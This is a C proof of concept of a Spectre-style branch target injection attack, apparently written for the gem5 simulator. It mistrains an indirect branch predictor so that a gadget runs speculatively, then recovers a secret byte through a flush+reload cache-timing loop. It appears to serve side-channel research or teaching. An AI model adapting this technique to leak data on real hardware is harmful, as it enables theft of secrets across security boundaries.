
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>
#include <gem5/m5ops.h>

#define CACHE_BLOCK_SIZE (64)
#define L1_HIT_THRESOLD (45)
#define NUM_CACHE_BLOCKS (256)

uint8_t (*fp_gadget[128*2])(void);
uint8_t (*fp_victim[128*2])(void);
uint8_t (*fp_gadget1[128*2])(void);
uint8_t (*fp_victim1[128*2])(void);

uint8_t probe_array[NUM_CACHE_BLOCKS * CACHE_BLOCK_SIZE];
unsigned long latencies[NUM_CACHE_BLOCKS];

//-------------------------------------------------------------
// Begin of victim code 
//-------------------------------------------------------------
uint8_t secret = 123;

uint8_t victim() { printf("calling victim...\n"); return 0; }
uint8_t gadget()
{
    return probe_array[secret * CACHE_BLOCK_SIZE];
}
//-------------------------------------------------------------
// End of victim code 
//-------------------------------------------------------------

int main()
{
    m5_set_numflush(1);

    // Use assembly to make a quick fucntion call
    extern uint8_t indirect_call(uint8_t (*)(void));

    // Assigne victim and gadget function pointers
    fp_victim1[CACHE_BLOCK_SIZE] = victim;
    fp_victim[CACHE_BLOCK_SIZE] = &fp_victim1[CACHE_BLOCK_SIZE];
    fp_gadget1[CACHE_BLOCK_SIZE] = gadget;
    fp_gadget[CACHE_BLOCK_SIZE] = &fp_gadget1[CACHE_BLOCK_SIZE];

    // mistrain to call gadget
    indirect_call(fp_gadget[CACHE_BLOCK_SIZE]);
    indirect_call(fp_gadget[CACHE_BLOCK_SIZE]);
    indirect_call(fp_gadget[CACHE_BLOCK_SIZE]);
    indirect_call(fp_gadget[CACHE_BLOCK_SIZE]);
    indirect_call(fp_gadget[CACHE_BLOCK_SIZE]);

    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        _mm_clflush(&probe_array[i * CACHE_BLOCK_SIZE]);
    }

    fp_gadget1[CACHE_BLOCK_SIZE] = gadget;
    fp_gadget[CACHE_BLOCK_SIZE] = &fp_gadget1[CACHE_BLOCK_SIZE];

    // wait for memory operations
    _mm_mfence();
    indirect_call(fp_victim[CACHE_BLOCK_SIZE]);

    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        unsigned int junk;
        unsigned long time1 = __rdtscp(&junk);
        junk ^= probe_array[i * CACHE_BLOCK_SIZE];
        unsigned long time2 = __rdtscp(&junk);
        latencies[i] = time2 - time1;
    }

    for (int i = 0; i < NUM_CACHE_BLOCKS; i++) {
        printf("%d: %lu, %s\n", i, latencies[i], (latencies[i] < L1_HIT_THRESOLD)? "hit": "miss");
    }

    return 0;
}

